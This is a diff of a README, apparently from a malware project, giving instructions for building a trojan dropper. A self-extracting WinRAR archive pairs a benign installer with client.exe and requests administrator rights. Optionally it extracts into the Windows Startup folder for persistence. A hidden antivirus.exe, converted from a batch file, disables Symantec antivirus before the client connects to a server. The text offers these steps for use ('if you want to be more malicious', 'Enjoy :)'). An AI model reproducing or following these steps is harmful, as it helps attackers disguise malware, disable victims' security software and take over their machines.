@@ -8,7 +8,7 @@ Create self-extracting ZIP with wirrar selecting three file: a benevolant instal
 In the settings of the self-extracting module, set the order of execution of the files, as first the benevolent installer and as the second the client.exe; select the checkbox to extract the files into a temporary folder or if you want to be more malicious specify the folder of the files that will be launched at the boot (%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup). 
 Always in the settings of the self-extracting module select request access with administrative rights.
 The file antivirus.exe is a windowsless .exe that disable Symantec antivirus. It will be launched by client.exe before connecting to the server.
-The antivirus.bat file contains the code of the homonymous .exe file.
-I used Slimm bat to exe to create to convert the .bat file into a windowsless .exe file
+The antivirus.bat file contains the code of the homonymous .exe file and anotother optional feature.
+I used "Slimm bat to exe.exe" to create to convert the .bat file into a windowsless .exe file
 
 Enjoy :)
